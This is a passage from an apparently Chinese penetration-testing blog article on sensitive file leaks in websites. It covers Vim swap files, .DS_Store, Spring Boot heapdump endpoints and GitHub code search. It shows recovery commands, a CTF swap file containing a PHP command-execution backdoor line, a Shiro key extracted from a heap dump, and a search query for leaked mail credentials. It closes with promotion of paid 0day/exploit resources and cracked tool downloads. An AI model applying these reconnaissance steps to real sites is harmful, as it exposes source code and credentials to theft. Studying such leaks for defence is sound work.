none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">多个 Vim 实例时的交换文件</span></span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">同样可能包含敏感信息</span></span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">filename~</span></span></code></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><strong style="box-sizing: border-box;font-weight: 700;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: normal;font-variant: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">备份文件（backup）</span></span></strong></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">完整的旧版本文件内容</span></span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.filename.un~</span></span></code></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">Undo 备份</span></span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">用于撤销操作的历史信息</span></span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.filename.swp.swp</span></span></code><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">或</span></span><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin-top: 0px;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.swpx</span></span></code></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">较新版本 Vim 格式</span></span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">一样可能被利用</span></span></section></td></tr></tbody></table>### 危害  
1. 源码泄露  
  
1. 敏感信息泄露  
  
1. 数据库账户和密码泄露  
  
### 利用  
  
进行
```
vim -r
```

  
或者
```
strings
```

  
进行文件恢复  

```
strings .index.php.swp 
b0VIM 9.0
kali
s1rius
/d/CTF/LitCTF/vim/index.php
utf-8
U3210
#&#34;! 
</body>
    </main>
        </div>
            ?>
            }
                eval(system($_POST['cmd']));
                echo &#34;<p>Oh You got my password!</p>&#34;;
            if ($_POST['password'] === base64_encode($password)) {
            echo &#34;<p>can can need Vim </p>&#34;;
            $password = &#34;Give_Me_Your_Flag&#34;;
            error_reporting(0);
```

  
.DS_Store文件泄漏漏洞  
### 简介  
  
它本是 macOS 系统自动生成的文件，但一旦出现在 Web 根目录并被访问，攻击者可能借此列目录、发现隐藏文件、下载敏感内容，甚至进一步入侵服务器。  
### 危害  
1. 目录结构泄露  
  
1. 发现敏感文件  
  
### 利用  

```
工具下载:https://github.com/lijiejie/ds_store_exp
```


```
hd.zj.qq.com/
└── themes
    └── galaxyw
        ├── app
        │   └── css
        │       └── style.min.css
        ├── cityData.min.js
        ├── images
        │   └── img
        │       ├── bg-hd.png
        │       ├── bg-item-activity.png
        │       ├── bg-masker-pop.png
        │       ├── btn-bm.png
        │       ├── btn-login-qq.png
        │       ├── btn-login-wx.png
        │       ├── ico-add-pic.png
        │       ├── ico-address.png
        │       ├── ico-bm.png
        │       ├── ico-duration-time.png
        │       ├── ico-pop-close.png
        │       ├── ico-right-top-delete.png
        │       ├── page-login-hd.png
        │       ├── pic-masker.png
        │       └── ticket-selected.png
        └── member
```

## heapdump文件泄露漏洞  
### 简介  
  

```
heapdump
```

  
泄露是 Java 应用（如 Spring Boot）中一个**严重的敏感信息泄露问题**  
，一旦被攻击者下载
```
.hprof
```

  
（Java 堆内存转储文件）  
### 危害  
  
用工具进行分析
```
heapdump
```

  
文件，可能会暴露Shiro框架的用户名和密码或者key，key的话可以进行测试shiro反序列化漏洞，常暴露
```
/heapdump.hprof
```

  
或
```
/actuator/heapdump
```

  
接口  
### 利用  
  
工具分析出的ShiroKey  

```
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = fBLM7VmgDVr7Rs6FMEIa4g==, algName = **AES**
```

  
后面可以用工具进行测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5oWhQnt0R7y7t7EeX83NkBZCBBaeCoiaTenf830xrozPCP4bvKr92icOlaT1Uvib27vicGXNeBfBVsiag/640?wx_fmt=png&from=appmsg "")  
### GitHub源码泄漏漏洞  
  
GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。  
  
类似的代码托管平台还有很多，人才是最大的漏洞。  

```
https://github.com/search?q=smtp+user+@qq.com&type=code
```

  
**0x03 总结**  
  
敏感信息泄露时有发生，而且通常会造成不可预知的危害，本文讨论了一些文件泄露的例子，可以说是信息泄露的一个子集。Git、SVN、Hg等版本控制目录无意暴露，会导致网站源码和配置信息泄露，通过GitHub等公开代码托管平台的信息收集，助力发现更多漏洞。  
喜欢的师傅可以点赞转发支持一下谢谢！  
  
  
**0x04 内部星球VIP介绍V1.4（更多未公开挖洞技术欢迎加入星球）**  
  
  
**如果你想学习更多另类渗透SRC挖洞技术/攻防/免杀/应急溯源/赏金赚取/工作内推/欢迎加入我们内部星球可获得内部工具字典和享受内部资源/内部群。**  
  
1.每周更新1day/0day漏洞刷分上分，目前已更新至4000+  
  
2.包含网上一些付费工具/各种插件BurpSuite漏洞检测插件/  
fuzz字典  
等等  
  
3.Fofa会员Ctfshow各种账号会员共享等等  
  
4.最新SRC挖掘/红队/代审/免杀/逆向视频资源等等  
  
5.2025  
HW漏洞POC/EXP分享地址：  
  
https://t.zsxq.com/Faujy  
  
...  
  
6.详情直接点击下方链接进入了解，后台回复"   
星球  
 "获取优惠先到先得！后续资源会更丰富在加入还是低价！（即将涨价）以上仅介绍部分内容还没完！**点击下方地址全面了解👇🏻**  
  
  
**👉****点击了解加入-->>2025内部VIP星球福利介绍V1.4版本-1day/0day漏洞库及内部资源更新**  
  
  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**  
" 获取 一些字典已重新划分处理**（需要内部专属fuzz字典可加入星球获取，内部字典多年积累整理好用！持续整理中！）**  
  
回复“**书籍**  
" 获取 网络安全相关经典书籍电子版pdf  
  
# 最后必看  
  
  
      
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
  
  
# 往期推荐  
  
  
**1.内部VIP知识星球福利介绍V1.4版本0day推送**  
  
**2.最新Nessus2025.6.9版本下载**  
  
**3.最新BurpSuite2025.5.1专业版下载**  
  
**4.最新xray1.9.11高级版下载Windows/Linux**  
  
**5.最新HCL AppScan_Standard_10.8.0.28408特别版下载**  
  
渗透安全HackTwo  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
上一篇文章：[全面资产收集流程及方法解析 万字长文窥探信息收集|挖洞技巧](https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247491574&idx=1&sn=48d865c82a228bd135a035419c765e94&scene=21#wechat_redirect)  
  
  
喜欢的师傅可以点赞转发支持一下  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
